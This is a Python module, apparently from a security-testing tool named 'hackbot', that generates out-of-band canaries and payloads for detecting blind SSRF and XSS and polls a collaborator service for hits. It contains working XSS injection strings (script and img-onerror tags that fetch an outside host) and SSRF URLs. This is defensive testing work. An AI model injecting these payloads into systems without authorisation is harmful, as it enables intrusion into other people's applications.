"""Out-of-band / blind canary helpers for SSRF and XSS.

Uses HACKBOT_OOB_BASE (e.g. https://YOUR.oast.fun or Burp Collaborator host).
Without OOB configured, still mints local unique markers for reflection checks.
"""

from __future__ import annotations

import json
import os
import secrets
import time
import urllib.error
import urllib.request
from typing import Any
from urllib.parse import urlparse


def oob_configured() -> bool:
    return bool((os.environ.get("HACKBOT_OOB_BASE") or "").strip())


def mint_canary(*, kind: str = "ssrf", tag: str = "") -> dict[str, Any]:
    """Create a unique canary id + payloads for injection."""
    token = secrets.token_hex(6)
    stamp = int(time.time())
    base = (os.environ.get("HACKBOT_OOB_BASE") or "").strip().rstrip("/")
    label = f"hb-{kind}-{token}"
    if tag:
        label = f"{label}-{tag[:12]}"

    http_url = ""
    dns_host = ""
    if base:
        parsed = urlparse(base if "://" in base else f"https://{base}")
        host = parsed.hostname or base.replace("https://", "").replace("http://", "")
        # Subdomain style: <label>.oob.example
        dns_host = f"{label}.{host}" if not host.startswith(label) else host
        scheme = parsed.scheme or "https"
        http_url = f"{scheme}://{dns_host}/{stamp}"
    else:
        # Local-only marker (reflection / log correlation)
        dns_host = f"{label}.oob.invalid"
        http_url = f"http://{dns_host}/{stamp}"

    xss_marker = f"hackbot_oob_{token}"
    return {
        "ok": True,
        "kind": kind,
        "token": token,
        "label": label,
        "oob_configured": bool(base),
        "http_url": http_url,
        "dns_host": dns_host,
        "xss_marker": xss_marker,
        "ssrf_payloads": [http_url, f"http://{dns_host}/", f"https://{dns_host}/"],
        "xss_payloads": [
            f"<script>fetch('{http_url}')</script>" if base else f"<script>{xss_marker}</script>",
            f'"><img src=x onerror=fetch("{http_url}")>' if base else f'">{xss_marker}',
        ],
        "hint": (
            "Inject payloads, then poll OOB / Collaborator for hits."
            if base
            else "Set HACKBOT_OOB_BASE to enable true blind/OOB detection."
        ),
    }


def poll_oob(canary: dict[str, Any], *, timeout: float = 8.0) -> dict[str, Any]:
    """Best-effort poll of Interactsh-style /poll if HACKBOT_OOB_POLL_URL is set.

    Many OOB services need auth tokens — we only hit an explicit poll URL.
    """
    poll = (os.environ.get("HACKBOT_OOB_POLL_URL") or "").strip()
    if not poll:
        return {
            "ok": True,
            "polled": False,
            "hits": [],
            "hint": "Set HACKBOT_OOB_POLL_URL for automated poll, or check Collaborator UI.",
            "token": canary.get("token"),
        }
    try:
        url = poll
        if "TOKEN" in poll:
            url = poll.replace("TOKEN", str(canary.get("token") or ""))
        req = urllib.request.Request(url, headers={"User-Agent": "hackbot-oob-poll"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(20_000).decode("utf-8", errors="replace")
        hits = []
        token = str(canary.get("token") or "")
        if token and token in body:
            hits.append({"matched": token, "preview": body[:200]})
        return {"ok": True, "polled": True, "hits": hits, "raw_len": len(body), "signal": bool(hits)}
    except Exception as exc:  # noqa: BLE001
        return {"ok": False, "polled": True, "error": f"{type(exc).__name__}: {exc}", "hits": []}


def enrich_ssrf_payloads(
    existing: list[tuple[str, tuple[str, ...]]],
    *,
    canary: dict[str, Any] | None = None,
) -> list[tuple[str, tuple[str, ...]]]:
    """Append OOB SSRF payloads when configured (reuse canary so poll matches inject)."""
    if not oob_configured():
        return existing
    c = canary or mint_canary(kind="ssrf")
    extra = [(p, (c["token"], c["label"], "oob")) for p in c["ssrf_payloads"][:2]]
    return list(existing) + extra
